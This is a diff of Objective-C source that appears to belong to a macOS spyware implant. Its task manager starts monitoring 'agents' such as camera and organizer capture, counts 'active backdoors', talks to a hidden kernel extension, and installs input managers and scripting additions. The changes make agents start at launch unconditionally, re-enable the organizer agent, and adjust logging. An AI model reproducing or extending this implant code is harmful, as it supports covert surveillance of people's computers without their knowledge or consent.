@@ -174,9 +174,7 @@ static NSLock *gSyncLock                  = nil;
       //
       // Start all the enabled agents
       //
-#ifndef NO_START_AT_LAUNCH
       [self startAgents];
-#endif
       
 #ifdef DEBUG_TASK_MANAGER
       infoLog(@"All Agents started");
@@ -430,9 +428,6 @@ static NSLock *gSyncLock                  = nil;
           int ret     = 0;
           int activeBackdoors = 1;
           
-          // Show KEXT
-          //ret = ioctl(kextFD, MCHOOK_SHOWK);
-          
           //
           // Get the number of active backdoors since we won't remove the
           // input manager if there's even one still registered
@@ -457,8 +452,8 @@ static NSLock *gSyncLock                  = nil;
                       infoLog(@"Removing scripting additions");
 #endif
                       destDir = [[NSString alloc]
-                                    initWithFormat: @"/Library/ScriptingAdditions/%@",
-                                           OSAX_FOLDER ];
+                                 initWithFormat: @"/Library/ScriptingAdditions/%@",
+                                                 OSAX_FOLDER];
                     }
                   else if (gOSMajor == 10 && gOSMinor == 5) 
                     {
@@ -466,8 +461,8 @@ static NSLock *gSyncLock                  = nil;
                       infoLog(@"Removing input manager");
 #endif
                       destDir = [[NSString alloc]
-                                           initWithFormat: @"/Library/InputManagers/%@",
-                                           INPUT_MANAGER_FOLDER ];
+                                 initWithFormat: @"/Library/InputManagers/%@",
+                                                 INPUT_MANAGER_FOLDER ];
                     }
                 
                   NSError *err;
@@ -476,10 +471,9 @@ static NSLock *gSyncLock                  = nil;
                                                                   error: &err])
                     {
 #ifdef DEBUG_TASK_MANAGER
-                      infoLog(@"uid  = %d", getuid());
-                      infoLog(@"euid = %d\n", geteuid());
-                      infoLog(@"Error while removing the input manager");
-                      infoLog(@"error: %@", [err localizedDescription]);
+                      errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+                      errorLog(@"Error while removing the input manager");
+                      errorLog(@"error: %@", [err localizedDescription]);
 #endif
                     }
                   
@@ -488,8 +482,8 @@ static NSLock *gSyncLock                  = nil;
               else
                 {
 #ifdef DEBUG_TASK_MANAGER
-                  infoLog(@"I don't have privileges for removing the input manager :(");
-                  infoLog(@"uid (%d) euid (%d)", getuid(), geteuid());
+                  errorLog(@"I don't have privileges for removing the input manager :(");
+                  errorLog(@"uid (%d) euid (%d)", getuid(), geteuid());
 #endif
                 }
             }
@@ -616,7 +610,6 @@ static NSLock *gSyncLock                  = nil;
           }
         break;
       }
-#if 0
     case AGENT_ORGANIZER:
       {
 #ifdef DEBUG_TASK_MANAGER
@@ -643,7 +636,6 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
-#endif
     case AGENT_CAM:
       {   
 #ifdef DEBUG_TASK_MANAGER
@@ -1053,7 +1045,6 @@ static NSLock *gSyncLock                  = nil;
         
         break;
       }
-#if 0
     case AGENT_ORGANIZER:
       {
 #ifdef DEBUG_TASK_MANAGER        
@@ -1077,7 +1068,6 @@ static NSLock *gSyncLock                  = nil;
 #endif
         break;
       }
-#endif
     case AGENT_CAM:
       {
 #ifdef DEBUG_TASK_MANAGER        
@@ -1351,7 +1341,7 @@ static NSLock *gSyncLock                  = nil;
                   {
                     // Hard error atm, think about default config parameters
 #ifdef DEBUG_TASK_MANAGER
-                    infoLog(@"Config not found");
+                    errorLog(@"Config not found");
 #endif
                     break;
                   }
@@ -1367,7 +1357,6 @@ static NSLock *gSyncLock                  = nil;
                                 
                 break;
               }
-#if 0
             case AGENT_ORGANIZER:
               {
 #ifdef DEBUG_TASK_MANAGER
@@ -1386,7 +1375,6 @@ static NSLock *gSyncLock                  = nil;
                 
                 break;
               }
-#endif
             case AGENT_CAM:
               {   
 #ifdef DEBUG_TASK_MANAGER
@@ -1760,7 +1748,6 @@ static NSLock *gSyncLock                  = nil;
                 
                 break;
               }
-#if 0
             case AGENT_ORGANIZER:
               {
 #ifdef DEBUG_TASK_MANAGER        
@@ -1777,15 +1764,13 @@ static NSLock *gSyncLock                  = nil;
                   }
                 else
                   {
-                    agentConfiguration = [self getConfigForAgent: agentID];
-                    [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+                    [anObject setObject: AGENT_STOPPED forKey: @"status"];
                   }
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Organizer stopped correctly");
 #endif
                 break;
               }
-#endif
             case AGENT_CAM:
               {
 #ifdef DEBUG_TASK_MANAGER
@@ -2487,7 +2472,7 @@ static NSLock *gSyncLock                  = nil;
 - (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID
 {
 #ifdef DEBUG_TASK_MANAGER
-  infoLog(@"getConfigForAgent called %x", anAgentID);
+  verboseLog(@"getConfigForAgent called %x", anAgentID);
 #endif
   
   NSMutableDictionary *anObject;
@@ -2502,14 +2487,14 @@ static NSLock *gSyncLock                  = nil;
            unsignedIntValue] == anAgentID)
         {
 #ifdef DEBUG_TASK_MANAGER
-          infoLog(@"Agent %d found", anAgentID);
+          verboseLog(@"Agent %d found", anAgentID);
 #endif
           return anObject;
         }
     }
   
 #ifdef DEBUG_TASK_MANAGER
-  infoLog(@"Agent %d not found", anAgentID);
+  verboseLog(@"Agent %d not found", anAgentID);
 #endif
 
   return nil;
